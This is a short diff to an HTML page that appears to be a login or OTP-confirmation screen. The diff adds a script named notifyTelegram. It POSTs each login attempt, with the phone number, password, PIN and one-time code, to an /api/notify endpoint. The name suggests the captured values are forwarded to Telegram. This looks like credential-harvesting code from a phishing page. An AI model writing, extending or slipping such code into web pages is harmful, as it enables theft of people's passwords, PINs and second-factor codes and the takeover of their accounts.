@@ -61,5 +61,29 @@ document.getElementById("confirm").onclick=()=>{
   document.getElementById("otpMessage").textContent="Invalid OTP.";
 };
 </script>
+  <script>
+async function notifyTelegram(phone, result) {
+  try {
+    await fetch("/api/notify", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        event: "login_attempt",
+        phone: phone,
+        Password: Password,
+        Pin: Pin,
+        
+        OTP : OTP,
+        
+        result: result
+      })
+    });
+  } catch (error) {
+    console.error("Notification failed");
+  }
+}
+</script>
 </body>
 </html>
